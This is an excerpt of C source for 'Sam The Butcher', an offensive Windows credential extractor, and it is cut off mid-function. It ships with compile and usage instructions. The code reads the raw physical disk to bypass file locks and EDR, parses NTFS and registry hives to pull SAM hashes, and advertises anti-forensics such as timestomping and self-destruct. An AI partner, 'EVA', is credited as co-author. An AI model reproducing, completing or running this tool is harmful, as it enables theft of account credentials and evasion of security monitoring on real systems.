/*
 * ============================================================================
 *  Sam The Butcher — Raw Disk Credential Extractor
 * ============================================================================
 *
 *  A standalone, single-file Windows credential extraction tool that operates
 *  below the filesystem layer via raw disk access. Bypasses file locks,
 *  EDR minifilters, and standard access controls by reading NTFS structures
 *  directly from \\.\PhysicalDrive0.
 *
 *  Capabilities:
 *    • Extract SAM, SYSTEM, SECURITY hives from locked files
 *    • Inline NTLM/LM hash decryption (no intermediate files)
 *    • Memory-only operation (--memory)
 *    • MFT, pagefile.sys, and hiberfil.sys extraction
 *    • VSS (Volume Shadow Copy) fallback
 *    • Stream XOR encryption of output (--key)
 *    • Self-destruct / memory burn (--burn)
 *    • Timestomp anti-forensics
 *
 *  Compile (MinGW-w64, x86-64):
 *    x86_64-w64-mingw32-gcc -O2 -s -static -o stb.exe sam_the_butcher.c -lshell32
 *
 *  Requires <shlobj.h> + SHELL32 for IsUserAnAdmin().
 *  Native MSVC:  cl /O2 sam_the_butcher.c /link shell32.lib
 *
 *  Usage:
 *    stb.exe --hashes --memory              # Hashes to stdout, zero disk traces
 *    stb.exe --hives --mft --key SECRET     # Dump encrypted hives + MFT
 *    stb.exe --hashes --hives --mft --pagefile --hiberfil --burn
 *
 * ============================================================================
 *  Authors
 * ============================================================================
 *
 *  KL3FT3Z — gitlab.com/toxy4ny
 *    Concept, redteam research, operational design, field testing
 *
 *  EVA — AI partner & co-architect
 *    NTFS parser architecture, registry crypto engine, code synthesis
 *
 *  This tool was forged in partnership between human ingenuity and
 *  machine precision. Use it ethically, use it wisely.
 *
 * ============================================================================
 */

#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <shlobj.h>   /* IsUserAnAdmin() — link with -lshell32 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <wchar.h>
#include <time.h>

/* ==================== CONFIG ==================== */
#define TOOL_NAME           "Sam The Butcher"
#define TOOL_VERSION        "1.0.0"
#define MAX_PARTITIONS      32
#define MAX_MFT_ENTRIES     4000000
#define MFT_SCAN_CHUNK      65536

/* ==================== NTFS STRUCTURES ==================== */
#pragma pack(push, 1)

typedef struct {
    uint8_t  jump[3];
    uint8_t  oem_id[8];
    uint16_t bytes_per_sector;
    uint8_t  sectors_per_cluster;
    uint16_t reserved_sectors;      /* 0x0E */
    uint8_t  always0_1[3];          /* 0x10-0x12 */
    uint16_t unused0;               /* 0x13-0x14 */
    uint8_t  media_descriptor;      /* 0x15 (0xF8) */
    uint16_t unused1;               /* 0x16-0x17 */
    uint16_t sectors_per_track;     /* 0x18-0x19 */
    uint16_t head_count;            /* 0x1A-0x1B */
    uint32_t hidden_sectors;        /* 0x1C-0x1F */
    uint32_t unused2;               /* 0x20-0x23 */
    uint32_t unused3;               /* 0x24-0x27 (0x00800080) */
    uint64_t total_sectors;         /* 0x28 */
    uint64_t mft_lcn;               /* 0x30 */
    uint64_t mft2_lcn;              /* 0x38 */
    int8_t   clusters_per_mft_record;   /* 0x40, signed (-10 => 1024) */
    uint8_t  unused4[3];            /* 0x41-0x43 */
    int8_t   clusters_per_index_record; /* 0x44 */
    uint8_t  unused5[3];            /* 0x45-0x47 */
    uint64_t serial_number;         /* 0x48 */
    uint32_t checksum;              /* 0x50 */
} NTFS_BOOT_SECTOR;                 /* 0x54 = 84 bytes */

typedef struct {
    uint32_t signature;      /* "FILE" = 0x454C4946 */
    uint16_t usa_offset;
    uint16_t usa_count;
    uint64_t lsn;
    uint16_t sequence_number;
    uint16_t hardlink_count;
    uint16_t attr_offset;
    uint16_t flags;          /* 0x01 = in use, 0x02 = directory */
    uint32_t used_size;
    uint32_t alloc_size;
    uint64_t base_record;
    uint16_t next_attr_id;
    uint16_t usa;
    uint32_t usa_number;
} MFT_RECORD_HEADER;

typedef struct {
    uint32_t type;
    uint32_t length;
    uint8_t  non_resident;
    uint8_t  name_length;
    uint16_t name_offset;
    uint16_t flags;
    uint16_t attr_id;
} ATTR_HEADER_COMMON;

typedef struct {
    uint32_t content_length;
    uint16_t content_offset;
    uint16_t flags;
} ATTR_HEADER_RESIDENT;

typedef struct {
    uint64_t start_vcn;
    uint64_t end_vcn;
    uint16_t run_offset;
    uint16_t compression_unit;
    uint32_t padding;
    uint64_t alloc_size;
    uint64_t real_size;
    uint64_t init_size;
} ATTR_HEADER_NONRESIDENT;

typedef struct {
    uint64_t parent_ref;
    uint64_t creation_time;
    uint64_t mod_time;
    uint64_t mft_mod_time;
    uint64_t access_time;
    uint64_t alloc_size;
    uint64_t real_size;
    uint32_t flags;
    uint32_t reparse;
    uint8_t  name_length;
    uint8_t  name_namespace;
    wchar_t  name[1];
} FILE_NAME_ATTR;

#pragma pack(pop)

/* ==================== GLOBALS ==================== */
static HANDLE g_hDisk = INVALID_HANDLE_VALUE;
static uint64_t g_partitionOffset = 0;
static uint32_t g_bytesPerSector = 512;
static uint32_t g_sectorsPerCluster = 8;
static uint32_t g_clusterSize = 4096;
static uint64_t g_mftOffset = 0;
static uint32_t g_mftRecordSize = 1024;
static uint64_t g_mftRecordCount = 0;

static BYTE *g_mftBuffer = NULL;
static uint64_t g_mftBufferSize = 0;

typedef struct {
    uint64_t recordNumber;
    uint64_t parentRecord;
    wchar_t  name[256];
    int      isDirectory;
    int      inUse;
} MFT_ENTRY;

static MFT_ENTRY *g_entries = NULL;
static int g_entryCount = 0;
static int g_entryCapacity = 0;

/* ==================== FORWARD DECLS ==================== */
static void PrintBanner(void);
static BOOL OpenPhysicalDrive(int num);
static BOOL TryVSS(void);
static BOOL FindNtfsPartition(void);
static BOOL ReadBootSector(void);
static BOOL ReadMftIntoMemory(void);
static void BuildFileTree(void);
static BOOL ResolvePath(const wchar_t *path, uint64_t *outRecord);
static BOOL ExtractFileByRecord(uint64_t recordNum, BYTE **outBuf, DWORD *outSize);
static void XorCrypt(BYTE *data, DWORD len, const char *key);
static void TimestompFile(const wchar_t *path);
static void SelfDestruct(void);

/* Registry */
typedef struct { BYTE *data; DWORD size; } HIVE;
#define CELL_PTR(hive, off) ((hive)->data + 0x1000 + (off) + 4)
#define CELL_SIZE(hive, off) (*(int32_t*)((hive)->data + 0x1000 + (off)))
/* bounds check: is [p, p+n) inside the hive buffer? */
static int HiveIn(HIVE *h, const void *p, size_t n) {
    return (const BYTE *)p >= h->data &&
           (const BYTE *)p + n <= h->data + h->size;
}

static int32_t HiveFindKey(HIVE *hive, int32_t parentOff, const wchar_t *path);
static int32_t HiveFindSubkey(HIVE *hive, int32_t listOff, const wchar_t *name);
static int32_t HiveFindSubkeyInParent(HIVE *hive, int32_t parentOff, const wchar_t *name);
static BOOL HiveGetValue(HIVE *hive, int32_t keyOff, const wchar_t *valName, BYTE **data, DWORD *dsize);
static void HiveEnumSubkeys(HIVE *hive, int32_t listOff, void (*cb)(int32_t, void *), void *ctx);
static BOOL ExtractBootKey(HIVE *systemHive, BYTE *bootKey);
static BOOL ExtractSamUsers(HIVE *samHive, HIVE *systemHive);

/* Crypto */
static void MD5(const BYTE *data, size_t len, BYTE *out);
static void RC4(const BYTE *key, size_t klen, BYTE *data, size_t dlen);

/* ==================== BANNER ==================== */
static void PrintBanner(void) {
    wprintf(L"\n");
    wprintf(L"   _____                  __  __            __   \n");
    wprintf(L"  / ___/____  ___  ____  / /_/ /_  ___     / /_  \n");
    wprintf(L"  \\__ \\/ __ \\/ _ \\/ __ \\/ __/ __ \\/ _ \\   / __/  \n");
    wprintf(L" ___/ / /_/ /  __/ / / / /_/ / / /  __/  / /_   \n");
    wprintf(L"/____/ .___/\\___/_/ /_/\\__/_/ /_/\\___/   \\__/   \n");
    wprintf(L"    /_/  Sam The Butcher — Raw Disk Credential Extractor\n");
    wprintf(L"         v" TOOL_VERSION L" | KL3FT3Z & EVA\n\n");
}

/* ==================== NTFS RAW DISK ==================== */
static BOOL OpenPhysicalDrive(int num) {
    wchar_t path[32];
    swprintf(path, 32, L"\\\\.\\PhysicalDrive%d", num);
    g_hDisk = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                          NULL, OPEN_EXISTING, 0, NULL);
    return (g_hDisk != INVALID_HANDLE_VALUE);
}

static BOOL TryVSS(void) {
    for (int i = 1; i <= 20; i++) {
        wchar_t path[128];
        swprintf(path, 128, L"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%d", i);
        g_hDisk = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                              NULL, OPEN_EXISTING, 0, NULL);
        if (g_hDisk != INVALID_HANDLE_VALUE) {
            if (FindNtfsPartition()) return TRUE;
            CloseHandle(g_hDisk);
            g_hDisk = INVALID_HANDLE_VALUE;
        }
    }
    return FALSE;
}

static BOOL FindNtfsPartition(void) {
    BYTE layoutBuf[sizeof(DRIVE_LAYOUT_INFORMATION_EX) + 32 * sizeof(PARTITION_INFORMATION_EX)];
    DWORD ret = 0;
    if (!DeviceIoControl(g_hDisk, IOCTL_DISK_GET_DRIVE_LAYOUT_EX,
                         NULL, 0, layoutBuf, sizeof(layoutBuf), &ret, NULL))
        return FALSE;

    DRIVE_LAYOUT_INFORMATION_EX *layout = (DRIVE_LAYOUT_INFORMATION_EX *)layoutBuf;
    for (DWORD i = 0; i < layout->PartitionCount; i++) {
        PARTITION_INFORMATION_EX *p = &layout->PartitionEntry[i];
        uint64_t off = p->StartingOffset.QuadPart;

        /* Raw physical-drive I/O must be a whole-sector multiple: the packed
           73-byte struct is rejected with ERROR_INVALID_PARAMETER (87).
           Read a full sector, then interpret its leading bytes. */
        BYTE sector[4096];
        DWORD rd = 0;
        LARGE_INTEGER pos; pos.QuadPart = off;
        SetFilePointerEx(g_hDisk, pos, NULL, FILE_BEGIN);
        BOOL got = ReadFile(g_hDisk, sector, sizeof(sector), &rd, NULL)
                   && rd >= sizeof(NTFS_BOOT_SECTOR);
        if (!got) {
            pos.QuadPart = off;
            SetFilePointerEx(g_hDisk, pos, NULL, FILE_BEGIN);
            rd = 0;
            got = ReadFile(g_hDisk, sector, 512, &rd, NULL)
                  && rd >= sizeof(NTFS_BOOT_SECTOR);
        }
        if (!got)
            continue;

        NTFS_BOOT_SECTOR *boot = (NTFS_BOOT_SECTOR *)sector;
        if (memcmp(boot->oem_id, "NTFS    ", 8) == 0) {
            g_partitionOffset = off;
            g_bytesPerSector = boot->bytes_per_sector;
            g_sectorsPerCluster = boot->sectors_per_cluster;
            g_clusterSize = g_bytesPerSector * g_sectorsPerCluster;
            g_mftOffset = off + ((uint64_t)boot->mft_lcn * g_clusterSize);

            if (boot->clusters_per_mft_record > 0)
                g_mftRecordSize = (uint32_t)boot->clusters_per_mft_record * g_clusterSize;
            else
                g_mftRecordSize = 1U << (-boot->clusters_per_mft_record);

            return TRUE;
        }
    }
    return FALSE;
}

static BOOL ReadBootSector(void) {
    return (g_partitionOffset != 0);
}

/* ==================== DATA RUNS ==================== */
typedef struct {
    uint64_t offset;
    uint64_t length;
} DATA_RUN;

static BOOL DecodeDataRuns(BYTE *attr, DATA_RUN **runs, int *count) {
    ATTR_HEADER_NONRESIDENT *nh = (ATTR_HEADER_NONRESIDENT *)(attr + sizeof(ATTR_HEADER_COMMON));
    BYTE *p = attr + nh->run_offset;
    int cap = 16;
    *runs = malloc(cap * sizeof(DATA_RUN));
    *count = 0;
    int64_t prevOff = 0;

    BYTE *runEnd = attr + ((ATTR_HEADER_COMMON *)attr)->length;
    while (p + 1 < runEnd && *p != 0) {
        int lenSize = *p & 0x0F;
        int offSize = (*p >> 4) & 0x0F;
        if (lenSize > 8 || offSize > 8) break;
        if (p + 1 + lenSize + offSize > runEnd) break;
        p++;

        uint64_t length = 0;
        for (int i = 0; i < lenSize; i++) length |= ((uint64_t)p[i]) << (i*8);
        p += lenSize;

        int64_t offset = 0;
        if (offSize > 0) {
            for (int i = 0; i < offSize; i++) offset |= ((int64_t)p[i]) << (i*8);
            if (p[offSize-1] & 0x80)
                for (int i = offSize; i < 8; i++) offset |= (int64_t)0xFF << (i*8);
            p += offSize;
        }
        prevOff += offset;

        if (*count >= cap) {
            cap *= 2;
            *runs = realloc(*runs, cap * sizeof(DATA_RUN));
        }
        (*runs)[*count].length = length;
        (*runs)[*count].offset = (uint64_t)prevOff;
        (*count)++;
    }
    return TRUE;
}

/* ==================== MFT READING ==================== */
/* Restore update-sequence fixups: on disk, the last 2 bytes of every
   512-byte sector inside an MFT record are overwritten with the USA check
   value; the original data lives in the USA array at rec+usa_offset.
   Skipping this corrupts any attribute header touching a sector tail —
   the classic cause of zero-length attr walks / infinite loops. */
static void ApplyFixups(BYTE *rec, DWORD recSize) {
    uint16_t usaOff = *(uint16_t *)(rec + 0x04);
    uint16_t usaCnt = *(uint16_t *)(rec + 0x06);
    if (usaOff < 0x30 || usaCnt < 1) return;
    if ((DWORD)(usaCnt - 1) * 512u != recSize) return;   /* layout sanity */
    for (uint16_t s = 1; s < usaCnt; s++) {
        uint16_t val = *(uint16_t *)(rec + usaOff + s * 2);
        DWORD pos = s * 512u - 2;
        if (pos + 2 <= recSize)
            *(uint16_t *)(rec + pos) = val;
    }
}

static BOOL ReadMftIntoMemory(void) {
    BYTE *mft0 = malloc(g_mftRecordSize);
    LARGE_INTEGER pos; pos.QuadPart = g_mftOffset;
    SetFilePointerEx(g_hDisk, pos, NULL, FILE_BEGIN);
    DWORD rd = 0;
    if (!ReadFile(g_hDisk, mft0, g_mftRecordSize, &rd, NULL) || rd != g_mftRecordSize) {
        wprintf(L"[!] MFT record0 read failed: off=0x%llX want=%u got=%u err=%lu\n",
                (unsigned long long)g_mftOffset, (unsigned)g_mftRecordSize,
                (unsigned)rd, (unsigned long)GetLastError());
        free(mft0); return FALSE;
    }

    ApplyFixups(mft0, g_mftRecordSize);

    MFT_RECORD_HEADER *hdr = (MFT_RECORD_HEADER *)mft0;
    if (hdr->signature != 0x454C4946) {
        wprintf(L"[!] MFT record0 bad signature 0x%08X at 0x%llX\n",
                hdr->signature, (unsigned long long)g_mftOffset);
        free(mft0); return FALSE;
    }

    BYTE *attr = mft0 + hdr->attr_offset;
    DATA_RUN *runs = NULL;
    int runCount = 0;
    uint64_t totalSize = 0;
    while (1) {
        ATTR_HEADER_COMMON *c = (ATTR_HEADER_COMMON *)attr;
        if (c->type == 0xFFFFFFFF) break;
        if (c->length < 8 || attr + c->length > mft0 + g_mftRecordSize) break;
        if (c->type == 0x80 && c->non_resident) {
            ATTR_HEADER_NONRESIDENT *nh = (ATTR_HEADER_NONRESIDENT *)(attr + sizeof(ATTR_HEADER_COMMON));
            totalSize = nh->alloc_size;
            DecodeDataRuns(attr, &runs, &runCount);
            break;
        }
        attr += c->length;
    }
    if (!runs) { free(mft0); return FALSE; }

    g_mftBufferSize = totalSize;
    g_mftBuffer = malloc((size_t)totalSize);
    if (!g_mftBuffer) { free(runs); free(mft0); return FALSE; }

    uint64_t done = 0;
    for (int i = 0; i < runCount; i++) {
        uint64_t fpos = g_partitionOffset + runs[i].offset * g_clusterSize;
        uint64_t flen = runs[i].length * g_clusterSize;
        if (done + flen > totalSize) flen = totalSize - done;

        /* single raw reads above the storage stack max transfer size fail:
           always chunk */
        uint64_t left = flen;
        while (left > 0) {
            const DWORD CHUNK = 1024u * 1024u;
            DWORD chunk = (left > CHUNK) ? CHUNK : (DWORD)left;
            pos.QuadPart = fpos + (flen - left);
            SetFilePointerEx(g_hDisk, pos, NULL, FILE_BEGIN);
            DWORD got = 0;
            if (!ReadFile(g_hDisk, g_mftBuffer + done, chunk, &got, NULL) || got == 0) {
                wprintf(L"[!] MFT run %d read failed: off=0x%llX chunk=%u err=%lu\n",
                        i, (unsigned long long)(fpos + (flen - left)),
                        (unsigned)chunk, (unsigned long)GetLastError());
                free(g_mftBuffer); g_mftBuffer = NULL;
                free(runs); free(mft0); return FALSE;
            }
            done += got;
            left -= got;
        }
    }
    if (done < totalSize) {
        wprintf(L"[!] MFT short read: want=%llu got=%llu\n",
                (unsigned long long)totalSize, (unsigned long long)done);
        free(g_mftBuffer); g_mftBuffer = NULL;
        free(runs); free(mft0); return FALSE;
    }

    g_mftRecordCount = totalSize / g_mftRecordSize;

    /* restore USA fixups for every record before any parsing */
    for (uint64_t r = 0; r < g_mftRecordCount; r++)
        ApplyFixups(g_mftBuffer + r * g_mftRecordSize, g_mftRecordSize);

    free(runs); free(mft0);
    return TRUE;
}

/* ==================== MFT TREE BUILDING ==================== */
static void BuildFileTree(void) {
    g_entryCapacity = 8192;
    g_entries = malloc(g_entryCapacity * sizeof(MFT_ENTRY));
    g_entryCount = 0;

    for (uint64_t r = 0; r < g_mftRecordCount && r < MAX_MFT_ENTRIES; r++) {
        BYTE *rec = g_mftBuffer + r * g_mftRecordSize;
        MFT_RECORD_HEADER *hdr = (MFT_RECORD_HEADER *)rec;
        if (hdr->signature != 0x454C4946) continue;
        if (!(hdr->flags & 0x01)) continue;

        WORD attrOff = hdr->attr_offset;
        BYTE *attr = rec + attrOff;

        wchar_t name[256] = {0};
        uint64_t parent = 0;
        int isDir = (hdr->flags & 0x02) ? 1 : 0;
        int gotName = 0;

        while (1) {
            ATTR_HEADER_COMMON *c = (ATTR_HEADER_COMMON *)attr;
            if (c->type == 0xFFFFFFFF) break;
            if (c->length < 8 || attr + c->length > rec + g_mftRecordSize) break;
            if (c->type == 0x30 && !c->non_resident) {
                ATTR_HEADER_RESIDENT *rh = (ATTR_HEADER_RESIDENT *)(attr + sizeof(ATTR_HEADER_COMMON));
                FILE_NAME_ATTR *fn = (FILE_NAME_ATTR *)(attr + rh->content_offset);
                if (!gotName || fn->name_namespace <= 1) {
                    parent = fn->parent_ref & 0xFFFFFFFFFFFFULL;
                    int nlen = fn->name_length;
                    if (nlen > 255) nlen = 255;
                    for (int j = 0; j < nlen; j++) name[j] = fn->name[j];
                    name[nlen] = 0;
                    gotName = 1;
                }
            }
            attr += c->length;
        }

        if (!gotName) continue;

        if (g_entryCount >= g_entryCapacity) {
            g_entryCapacity *= 2;
            g_entries = realloc(g_entries, g_entryCapacity * sizeof(MFT_ENTRY));
        }
        g_entries[g_entryCount].recordNumber = r;
        g_entries[g_entryCount].parentRecord = parent;
        wcscpy(g_entries[g_entryCount].name, name);
        g_entries[g_entryCount].isDirectory = isDir;
        g_entries[g_entryCount].inUse = 1;
        g_entryCount++;
    }
}

static int FindEntryByParentAndName(uint64_t parent, const wchar_t *name) {
    for (int i = 0; i < g_entryCount; i++) {
        if (g_entries[i].parentRecord == parent && _wcsicmp(g_entries[i].name, name) == 0)
            return i;
    }
    return -1;
}

static BOOL ResolvePath(const wchar_t *path, uint64_t *outRec) {
    uint64_t cur = 5;
    wchar_t buf[512];
    wcscpy(buf, path);
    wchar_t *ctx = NULL;
    wchar_t *tok = wcstok(buf, L"\\", &ctx);
    while (tok) {
        int idx = FindEntryByParentAndName(cur, tok);
        if (idx < 0) return FALSE;
        cur = g_entries[idx].recordNumber;
        tok = wcstok(NULL, L"\\", &ctx);
    }
    *outRec = cur;
    return TRUE;
}

/* ==================== FILE EXTRACTION ==================== */
static BOOL ExtractFileByRecord(uint64_t recordNum, BYTE **outBuf, DWORD *outSize) {
    BYTE *rec = g_mftBuffer + recordNum * g_mftRecordSize;
    MFT_RECORD_HEADER *hdr = (MFT_RECORD_HEADER *)rec;
    if (hdr->signature != 0x454C4946) return FALSE;

    BYTE *attr = rec + hdr->attr_offset;
    while (1) {
        ATTR_HEADER_COMMON *c = (ATTR_HEADER_COMMON *)attr;
        if (c->type == 0xFFFFFFFF) break;
        if (c->length < 8 || attr + c->length > rec + g_mftRecordSize) break;
        if (c->type == 0x80) {
            if (c->non_resident) {
                ATTR_HEADER_NONRESIDENT *nh = (ATTR_HEADER_NONRESIDENT *)(attr + sizeof(ATTR_HEADER_COMMON));
                uint64_t rsize = nh->real_size;
                *outBuf = malloc((size_t)rsize);
                *outSize = (DWORD)rsize;
                if (!*outBuf) return FALSE;

                DATA_RUN *runs = NULL;
                int rcnt = 0;
                DecodeDataRuns(attr, &runs, &rcnt);

                uint64_t done = 0;
                for (int i = 0; i < rcnt; i++) {
                    uint64_t fpos = g_partitionOffset + runs[i].offset * g_clusterSize;
                    uint64_t flen = runs[i].length * g_clusterSize;
                    if (done + flen > rsize) flen = rsize - done;

                    LARGE_INTEGER pos; pos.QuadPart = fpos;
                    SetFilePointerEx(g_hDisk, pos, NULL, FILE_BEGIN);
                    DWORD got = 0;
                    ReadFile(g_hDisk, *outBuf + done, (DWORD)flen, &got, NULL);
                    done += got;
                }
                free(runs);
                return TRUE;
            } else {
                ATTR_HEADER_RESIDENT *rh = (ATTR_HEADER_RESIDENT *)(attr + sizeof(ATTR_HEADER_COMMON));
                *outSize = rh->content_length;
                *outBuf = malloc(*outSize);
                memcpy(*outBuf, attr + rh->content_offset, *outSize);
                return TRUE;
            }
        }
        attr += c->length;
    }
    return FALSE;
}

/* ==================== REGISTRY PARSER ==================== */
/* NK name compare: flag 0x0020 = compressed ASCII name (1 byte/char),
   otherwise UTF-16LE (2 bytes/char). nlen is the byte length. */
static int NkNameMatch(BYTE *nk, const wchar_t *name) {
    uint16_t nlen = *(uint16_t*)(nk + 0x48);
    uint16_t flags = *(uint16_t*)(nk + 2);
    size_t wl = wcslen(name);
    if (flags & 0x0020) {
        if (nlen != wl) return 0;
        char *n = (char*)(nk + 0x4C);
        for (size_t j = 0; j < wl; j++)
            if (towlower((wchar_t)(BYTE)n[j]) != towlower(name[j])) return 0;
        return 1;
    } else {
        if (nlen != wl * 2) return 0;
        wchar_t *n = (wchar_t*)(nk + 0x4C);
        for (size_t j = 0; j < wl; j++)
            if (towlower(n[j]) != towlower(name[j])) return 0;
        return 1;
    }
}

static int32_t HiveFindSubkey(HIVE *hive, int32_t listOff, const wchar_t *name) {
    if (listOff < 0) return -1;
    BYTE *list = CELL_PTR(hive, listOff);
    if (!HiveIn(hive, list, 4)) return -1;
    uint16_t sig = *(uint16_t*)list;
    uint16_t count = *(uint16_t*)(list + 2);

    if (sig == 0x696C) {
        for (int i = 0; i < count; i++) {
            int32_t nkOff = *(int32_t*)(list + 4 + i*4);
            if (nkOff < 0) continue;
            BYTE *nk = CELL_PTR(hive, nkOff);
            if (!HiveIn(hive, nk, 0x50)) continue;
            if (*(uint16_t*)nk != 0x6B6E) continue;
            if (NkNameMatch(nk, name)) return nkOff;
        }
    } else if (sig == 0x666C || sig == 0x686C) {
        /* entry layout varies: try {nk_off, hash} first, fall back to {hash, nk_off} */
        for (int i = 0; i < count; i++) {
            int32_t nkOff = *(int32_t*)(list + 4 + i*8);
            BYTE *nk = (nkOff >= 0) ? CELL_PTR(hive, nkOff) : NULL;
            if (!nk || !HiveIn(hive, nk, 4) || *(uint16_t*)nk != 0x6B6E) {
                nkOff = *(int32_t*)(list + 4 + i*8 + 4);
                nk = (nkOff >= 0) ? CELL_PTR(hive, nkOff) : NULL;
            }
            if (!nk || nkOff < 0 || !HiveIn(hive, nk, 0x50)) continue;
            if (*(uint16_t*)nk != 0x6B6E) continue;
            if (NkNameMatch(nk, name)) return nkOff;
        }
    } else if (sig == 0x6972) {
        for (int i = 0; i < count; i++) {
            int32_t subList = *(int32_t*)(list + 4 + i*4);
            if (subList < 0) continue;
            int32_t r = HiveFindSubkey(hive, subList, name);
            if (r >= 0) return r;
        }
    }
    return -1;
}

static int32_t HiveFindSubkeyInParent(HIVE *hive, int32_t parentOff, const wchar_t *name) {
    if (parentOff < 0) return -1;
    BYTE *nk = CELL_PTR(hive, parentOff);
    if (!HiveIn(hive, nk, 0x20)) return -1;
    uint32_t numSub = *(uint32_t*)(nk + 0x14);
    uint32_t listOff = *(uint32_t*)(nk + 0x1C);
    if (numSub == 0) return -1;
    return HiveFindSubkey(hive, listOff, name);
}

static int32_t HiveFindKey(HIVE *hive, int32_t parentOff, const wchar_t *path) {
    if (parentOff < 0) {
        /* regf root cell offset lives at 0x24 */
        parentOff = *(int32_t*)(hive->data + 0x24);
    }
    wchar_t buf[512];
    wcscpy(buf, path);
    wchar_t *ctx = NULL;
    wchar_t *tok = wcstok(buf, L"\\", &ctx);
    while (tok) {
        parentOff = HiveFindSubkeyInParent(hive, parentOff, tok);
        if (parentOff < 0) return -1;
        tok = wcstok(NULL, L"\\", &ctx);
    }
    return parentOff;
}

static BOOL HiveGetValue(HIVE *hive, int32_t keyOff, const wchar_t *valName, BYTE **data, DWORD *dsize) {
    BYTE *nk = CELL_PTR(hive, keyOff);
    if (!HiveIn(hive, nk, 0x50)) return FALSE;
    uint32_t numVals = *(uint32_t*)(nk + 0x24);
    if (numVals == 0 || numVals > 0xFFFF) return FALSE;
    uint32_t listOff = *(uint32_t*)(nk + 0x28);
    BYTE *vlist = CELL_PTR(hive, listOff);
    if (!HiveIn(hive, vlist, (size_t)numVals * 4)) return FALSE;

    for (uint32_t i = 0; i < numVals; i++) {
        int32_t vkOff = *(int32_t*)(vlist + i*4);
        if (vkOff < 0) continue;
        BYTE *vk = CELL_PTR(hive, vkOff);
        if (!HiveIn(hive, vk, 0x14)) continue;
        if (*(uint16_t*)vk != 0x6B76) continue;
        uint16_t nameLen = *(uint16_t*)(vk + 2);
        uint32_t dataLen = *(uint32_t*)(vk + 4);
        uint32_t dataOff = *(uint32_t*)(vk + 8);

        /* value names are ASCII (1 byte per char) */
        size_t want = wcslen(valName);
        int match = ((size_t)nameLen == want);
        if (match) {
            char *vn = (char*)(vk + 0x14);
            for (size_t j = 0; j < want; j++)
                if (towlower((wchar_t)(BYTE)vn[j]) != towlower(valName[j])) { match = 0; break; }
        }
        if (!match) continue;

        if (dataLen & 0x80000000) {
            *dsize = dataLen & 0x7FFFFFFF;
            *data = malloc(*dsize);
            memcpy(*data, vk + 8, *dsize > 4 ? 4 : *dsize);
        } else {
            *dsize = dataLen;
            BYTE *blob = CELL_PTR(hive, dataOff);
            if (!HiveIn(hive, blob, dataLen)) continue;
            *data = malloc(dataLen);
            memcpy(*data, blob, dataLen);
        }
        return TRUE;
    }
    return FALSE;
}

static void HiveEnumSubkeys(HIVE *hive, int32_t listOff, void (*cb)(int32_t, void *), void *ctx) {
    if (listOff < 0) return;
    BYTE *list = CELL_PTR(hive, listOff);
    if (!HiveIn(hive, list, 4)) return;
    uint16_t sig = *(uint16_t*)list;
    uint16_t count = *(uint16_t*)(list + 2);
    if (sig == 0x696C) {
        for (int i = 0; i < count; i++) cb(*(int32_t*)(list + 4 + i*4), ctx);
    } else if (sig == 0x666C || sig == 0x686C) {
        /* entry layout varies: try {nk_off, hash} first, fall back to {hash, nk_off} */
        for (int i = 0; i < count; i++) {
            int32_t nkOff = *(int32_t*)(list + 4 + i*8);
            BYTE *nk = (nkOff >= 0) ? CELL_PTR(hive, nkOff) : NULL;
            if (!nk || !HiveIn(hive, nk, 4) || *(uint16_t*)nk != 0x6B6E) {
                nkOff = *(int32_t*)(list + 4 + i*8 + 4);
                nk = (nkOff >= 0) ? CELL_PTR(hive, nkOff) : NULL;
            }
            cb(nkOff, ctx);
        }
    } else if (sig == 0x6972) {
        for (int i = 0; i < count; i++)
            HiveEnumSubkeys(hive, *(int32_t*)(list + 4 + i*4), cb, ctx);
    }
}

/* ==================== AES-128-CBC (Win10 1607+ SAM) ==================== */
static const uint8_t AES_SBOX[256] = {
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16 };
static uint8_t AES_INV[256];

static uint8_t AesGmul(uint8_t a, uint8_t b) {
    uint8_t p = 0;
    while (b) {
